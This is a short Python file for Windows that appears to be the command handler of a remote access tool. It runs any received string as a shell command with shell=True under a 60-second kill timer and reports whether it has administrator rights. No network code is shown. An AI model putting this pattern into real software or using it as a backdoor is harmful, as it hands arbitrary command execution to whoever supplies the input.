import subprocess, threading, ctypes

def handle_command(data):
	command = data.split()[0]
	arguments = " ".join(data.split()[1:])
	if command == "test":
		return test(arguments)
	elif command == "isadmin":
		if is_admin():
			return "[+]Current process has admin privileges."
		return "[-]Current process does not have admin privileges."
	else:
		return execute_command(command + " " + arguments)

def execute_command(cmde): #Function to execute commands
		if cmde:
			proc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
			timer = threading.Timer(60, proc_kill, [proc])
			timer.start()
			out = proc.stdout.read() + proc.stderr.read()
			timer.cancel()
			return out
		else:
			return "[-]Enter a command."
			
def is_admin(): # Is current account admin?
    return ctypes.windll.shell32.IsUserAnAdmin() != 0
			
def test(data):
	return data.upper()[::-1]